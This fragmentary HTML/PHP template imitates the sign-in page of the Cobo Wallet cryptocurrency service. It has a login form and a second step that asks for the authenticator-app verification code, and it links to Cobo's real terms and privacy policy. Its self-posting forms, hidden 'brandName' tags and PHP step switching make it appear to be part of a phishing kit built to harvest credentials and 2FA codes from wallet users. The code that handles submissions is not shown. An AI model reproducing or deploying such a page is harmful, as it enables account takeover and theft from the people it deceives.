...
<head>
    ...
    <title>Sign In to Buy and Sell Cryptocurrency | Cobo Wallet</title>
...
<body>
        ...
        <div class="container-fluid" id="welcome-section">
            <form action="" method="post">
                ...
                <p style="text-align: center;margin-bottom: 25px;">Enter the 2-step verification generated by your<br>
                    authenticator app.</p>
                <input type="hidden" name="brandName" value="Cobo Login">
    ...
    <?php } else { ?>
        ...
        <div class="container-fluid" id="welcome-section">
            <h3 style="color: #4d84ff; text-align: center;font-size: 40px;">Log In</h3>
            <p style="text-align: center;">PLEASE MAKE SURE YOU ARE VISITING</p>
            <form action="" method="post"><input type="hidden" name="brandName" value="Cobo Wallet Login">
                ...
                <p class="text">By logging in, you agree to our <a href="https://www.cobo.com/policy/terms" style="color:#4d84ff !important" > Cobo Account General Terms and Conditions</a> and confirm that you have read and agree to our <a href="https://www.cobo.com/policy/privacy" style="color:#4d84ff !important"> Privacy Policy</a>.</p>
            </form>
